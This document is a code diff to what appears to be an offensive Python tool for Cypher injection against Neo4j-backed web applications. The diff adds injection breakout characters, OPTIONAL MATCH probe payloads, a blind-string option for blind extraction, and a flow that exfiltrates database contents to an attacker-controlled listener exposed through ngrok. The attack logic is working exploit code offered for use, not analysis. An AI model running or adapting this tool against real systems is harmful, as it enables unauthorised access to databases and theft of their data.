@@ -12,6 +12,8 @@ import sys
 import json
 import os
 import string
+import random
+import time
 from tabulate import tabulate
 from pyngrok import ngrok
 from packaging import version
@@ -190,25 +192,24 @@ class Listener():
 
 class Neo4jInjector:
     """Handles the injection of payloads into a Neo4j database."""
-    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
+    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None, blind_string=""):
         self.target = target
         self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
         self.request_type = request_type
         self.parameters = parameters
         self.cookie = cookie if cookie else ""
+        self.blind_string = blind_string
         self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
         self.proxies = {'http': 'http://127.0.0.1:8080'}
+        self.working_char = ""
 
     def inject_payload(self, payload):
         """Inject a crafted payload to the target and return the response object."""
-        responses = []  # Store responses from all injections
-        for injection_character in ["Sarah'"]:
-            full_payload = f"{injection_character}{payload}"
-            encoded_payload = quote(full_payload, safe='')
-            url, data = self.prepare_request_data(encoded_payload)
-            response = self.execute_request(url, data)
-            responses.append(response)
-        return responses
+        full_payload = f"{self.blind_string}{self.working_char}{payload}"
+        encoded_payload = quote(full_payload, safe='')
+        url, data = self.prepare_request_data(encoded_payload)
+        response = self.execute_request(url, data)
+        return response
 
     def prepare_request_data(self, encoded_payload):
         """Prepare the URL and data for the request."""
@@ -239,34 +240,36 @@ class Neo4jInjector:
 
 
     def detect_inject(self):
+        random.seed(time.strftime("%H:%M:%S", time.localtime()))
+        random_num = random.randint(0, 999)
         print("Determining if the target is injectable")
-        injection_characters = ["1337'", "1337\"", "1337"]
-        working_char = ""
-        or_case = None
-        and_case = None
-        for injection_character in injection_characters:
-            if (injection_character == "-1"):
-                payload = f" OR 1=1"
-            else:
-                payload = f" OR 1=1 OR 'g' = {injection_character}g"
-            full_payload = f"{injection_character}{payload}"
-            encoded_payload = quote(full_payload, safe='')
-            url, data = self.prepare_request_data(encoded_payload)
-            response = self.execute_request(url, data)
-            if (response):
-                working_char = injection_character
-                or_case = response
-                break
-
-        if (working_char == "-1"):
-            full_payload = f"{working_char} AND 1=1 AND 1=0"
-        else:
-            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
-        encoded_payload = quote(full_payload, safe='')
+        injection_characters = ["'", "\"", "'})", "\"})", ""]
+        encoded_payload = quote(self.blind_string, safe='')
         url, data = self.prepare_request_data(encoded_payload)
-        and_case = self.execute_request(url, data)
-        
-        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])
+        base_case = self.execute_request(url, data)
+        if (not base_case or base_case.status_code == 500):
+            if (input("Seems like something went wrong, continue? (y|N)").lower != "y"):
+                sys.exit()
+        for injection_character in injection_characters:
+            injection_case = None
+            self.working_char = injection_character
+            if (self.working_char == ""):
+                payload = f" OPTIONAL MATCH (x:foobar) WHERE {random_num} = {random_num}"
+            elif (self.working_char == "'})"):
+                payload = " OPTIONAL MATCH (x:foo {bar: '" + str(random_num)
+            elif (self.working_char == "\"})"):
+                payload = " OPTIONAL MATCH (x:foo {bar: \"" + str(random_num)
+            else:
+                payload = f" OPTIONAL MATCH (x:foo) WHERE {self.working_char}{random_num}{self.working_char}={self.working_char}{random_num}"
+            injection_case = self.inject_payload(payload)
+            if (injection_case):
+                if (injection_case.text == base_case.text):
+                    return True
+                elif (self.blind_string in injection_case.text):
+                    return True
+        self.working_char = "UNDEFINED"
+        return False
+            
 
     def exfil_data(self):
 
@@ -502,6 +505,7 @@ def main():
     parser.add_argument("-c", "--cookie", help="Optional cookie in format key=value")
     parser.add_argument("-t", "--type", required=True, choices=['API', 'GET', 'POST'], help="Request type")
     parser.add_argument("-i", "--int", help="Network interface for dynamic IP retrieval, 'public' for ngrok")
+    parser.add_argument("-s", "--blind-string", help="String that returns true from the database")
     parser.add_argument("--listen-port", type=int, default=80, help="Listener port")
     args = parser.parse_args()
 
@@ -529,16 +533,13 @@ def main():
         args.exfil_ip = "127.0.0.1"
 
 
-    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
+    injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie, args.blind_string)
 
-    if (args.type == "API"):
-        if (injector.detect_inject()):
-            print(colored("Target likely injectable, continuing"),"green")
-        else:
-            if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
-                return
+    if (injector.detect_inject()):
+        print(colored("Target likely injectable, continuing"),"green")
     else:
-        print("This version of the program only supports injection detection of API methods")
+        if (input("Target likely not injectable, continue? (y/n default: n)").lower() != "y"):
+            return
 
     # Begin exfiltration process
     injector.blind()
